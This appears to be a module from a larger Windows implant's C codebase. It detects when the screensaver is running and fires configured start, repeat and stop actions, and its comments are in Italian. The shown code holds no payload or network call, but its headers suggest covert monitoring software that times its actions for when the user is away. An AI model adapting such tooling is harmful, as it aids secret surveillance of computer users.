#include <Windows.h>
#include <cJSON/cJSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// MONITOR SALVASCHERMO

typedef struct {
	EVENT_PARAM event_param;
	DWORD event_id;
} monitored_screensaver;

DWORD screensaver_count = 0;
monitored_screensaver* screensaver_table = NULL;
BOOL em_ss_present = FALSE;
HANDLE em_ss_thread = 0;
BOOL em_ss_cp = FALSE;

#define EM_SS_SLEEPTIME 300

BOOL IsSaverRunning()
{
	BOOL ret, srunning = FALSE;

	// Se fallisce, assume che non si attivo
	// SPI_GETSCREENSAVERRUNNING richiede che WINVER sia>=0x500 
	ret = FNC(SystemParametersInfoA)(SPI_GETSCREENSAVERRUNNING, 0, &srunning, 0);

	return srunning && ret;
}


DWORD MonitorScreenSaver(DWORD dummy)
{
	LOOP{
		DWORD i;
		CANCELLATION_POINT(em_ss_cp);

		if (IsSaverRunning()) {
			// Se lo screensaver e' presente e non era stato rilevato
			if (!em_ss_present) {
				em_ss_present = TRUE;
				for (i = 0; i < screensaver_count; i++) {
					TriggerEvent(screensaver_table[i].event_param.start_action, screensaver_table[i].event_id);
					CreateRepeatThread(screensaver_table[i].event_id, screensaver_table[i].event_param.repeat_action, screensaver_table[i].event_param.count, screensaver_table[i].event_param.delay);
				}
			}
		}
 else {
			// Se lo screensaver non e' presente ed era stato rilevato
			if (em_ss_present) {
				em_ss_present = FALSE;
				for (i = 0; i < screensaver_count; i++) {
					StopRepeatThread(screensaver_table[i].event_id);
					TriggerEvent(screensaver_table[i].event_param.stop_action, screensaver_table[i].event_id);
				}
			}
		}

		Sleep(EM_SS_SLEEPTIME);
	}

		// not reached
	return 0;
}


void WINAPI EM_ScreenSaverAdd(cJSON *conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;

	if (!(temp_table = realloc(screensaver_table, (screensaver_count + 1) * sizeof(monitored_screensaver))))
		return;

	screensaver_table = (monitored_screensaver*)temp_table;
	memcpy(&screensaver_table[screensaver_count].event_param, event_param, sizeof(EVENT_PARAM));
	screensaver_table[screensaver_count].event_id = event_id;

	screensaver_count++;
}


void WINAPI EM_ScreenSaverStart()
{
	DWORD dummy;

	// Crea il thread solo se ci sono azioni da fare
	if (screensaver_count > 0)
		em_ss_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorScreenSaver, NULL, 0, &dummy);
}


void WINAPI EM_ScreenSaverStop()
{
	QUERY_CANCELLATION(em_ss_thread, em_ss_cp);

	for (DWORD i = 0; i < screensaver_count; i++)
		StopRepeatThread(screensaver_table[i].event_id);

	SAFE_FREE(screensaver_table);
	em_ss_present = FALSE;
	screensaver_count = 0;
}
